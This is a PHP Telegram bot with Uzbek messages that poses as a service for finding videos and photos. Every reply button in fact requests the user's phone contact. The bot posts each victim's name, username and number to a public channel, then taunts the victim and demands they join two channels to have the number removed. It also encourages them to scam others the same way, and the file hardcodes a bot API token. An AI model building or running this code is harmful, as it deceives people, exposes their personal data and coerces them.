<?php
define('API_KEY','1054675745:AAFzgSBI1djyu2e3TJflqDb7sEixd9ESd-g');
$admin = "@qizlarning_nomeri";
function del($nomi){
array_map('unlink', glob("$nomi"));
}

function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;


if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"  *Assalomu alaykum🙋‍♂hurmatli foydalanuvchi * \nBIZNING BOT JUDA
Ham xush momila 
bu botni vazifasi
sizga istagan vedio yoki rasminggizni topib beradi100%
siz faqat izlayotgan narsanggizni bazi bir
malulotini(nomi,mg ti,davomiyligini yani qancha vaqt,adib,aqalli bittasi)istagan birini kirita olsangiz bas.
siz ayni paytda qaysi tarmoqdan[telegram,google,chrome, va h.k] izlashimizni ayting
bu amalni pastdagi kinopkalar orqali bajaring
yani shunchaki google yoki telegram deb yozmang sabab u tarzida kiritsanggiz bot javob qaytarmaydi
pastdagi kinopkalarni tanlash kerak !!!!\n
sizga omad yor bo‘lsin
💪🙏🙏🙏🙏💪 ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(
['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"🤗TELEGRAM🤔",'request_contact' =>true],["text"=>"CHROME",'request_contact' =>true],
],[["text"=>"GOOGLE",'request_contact' =>true],["text"=>"BARCHASI",'request_contact' =>true],
],
]
])
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"@qizlarning_nomeri",
    'text'=>"User idsi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"endi esa izlayotgan narsanggiz haqida malumot berishinggiz kerak
kiyingi tugmani BOSING
👇👇👇👇👇👇",
    'reply_markup'=>json_encode(
[
'resize_keyboard'=>true,
'selective'=>true,
'one_time_keyboard'=>true,
'keyboard' => [
[["text"=>"to'liqroq ma'lumot olish"],],
]
])
]);
}
$button = $message->keyboardbutton->text;
if($text == "to'liqroq ma'lumot olish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"xullas yaxshigina uxlading
sini aldashdi menga nomeringni berding👆👆👆👆
usha nomering.   @qizlarning_nomeri
kanaliga tushdi agar tezroq
bizning @XABARCHILAR va @qizlarning_nomeri kanallariga azo bo‘lsang botni o‘zi sening nomeringni @qizlarning_nomeri kanalidan olib tashlaydi shunday ekan tezroq A'ZO bo‘l
agar kimnidir aldab nomerini olmoqchi bo‘lsang men kabi aldoqchi botlar @qizlarning_nomeri
kanalining icbida juda k'op sen ham qollab ko‘r 
kimnidir xuddu shu usul bilan nomerini bilib ol
hammaga OMAD
yaratuvchi ->  @XABARCHILAR  "]);
}

